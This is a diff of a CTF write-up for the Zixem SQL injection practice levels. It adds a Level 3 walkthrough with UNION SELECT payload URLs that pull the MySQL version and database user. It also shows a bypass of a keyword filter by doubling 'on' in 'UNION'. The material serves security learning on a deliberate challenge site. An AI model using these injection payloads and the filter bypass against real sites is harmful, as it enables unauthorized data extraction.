@@ -17,7 +17,8 @@
 ===========================================================================================================  
 
 ## [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
-Start: `[https://zixem.altervista.org/SQLi/level1.php?id=1](https://zixem.altervista.org/SQLi/level1.php?id=1)`  
+Start:  
+`[https://zixem.altervista.org/SQLi/level1.php?id=1](https://zixem.altervista.org/SQLi/level1.php?id=1)`  
 > - **Item ID:** 1
 > - **Price:** 20$
 
@@ -50,7 +51,8 @@ Ok let's extract *version()* and *user()*:
 ===========================================================================================================  
 
 ## [Level 2](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-2)
-Start: `[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zixem.altervista.org/SQLi/level2.php?showprofile=4)`  
+Start:  
+`[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zixem.altervista.org/SQLi/level2.php?showprofile=4)`  
 > - **User-ID:** 4
 > - **Username:** ZiX-M
 > - **Age:** 17
@@ -79,6 +81,29 @@ Start: `[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zix
 > - **User-ID:** 5.6.33-log
 > - **Username:** zixem@localhost
 > - **Age:** 3
+
+**Bazinga!**  
+###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
+
+## [Level 3](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-3)
+Start:  
+`[https://zixem.altervista.org/SQLi/level3.php?item=3](https://zixem.altervista.org/SQLi/level3.php?item=3)`  
+> - **ItemID:** 3
+> - **Item Name:** Laptop
+> - **Seller:** Team Digi7al
+
+=> Test with prev Payload:  
+`https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uni select version(),user(),3,4--''' at line 1
+
+=> The error message tells us that the statement is being interpreted as `"uni select version(),user(),3,4--''"`, which means that the `on` of union is being filtered out. To combat this, we can add another `on`, so that even after it is removed, the statement still reads union:  
+##### Result: #####  
+`https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNIONON%20SELECT%20version(),user(),3,4--%27`
+> - **ItemID:** 5.6.33-log
+> - **Item Name:** zixem@localhost
+> - **Seller:** 3
 
 **Bazinga!**  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
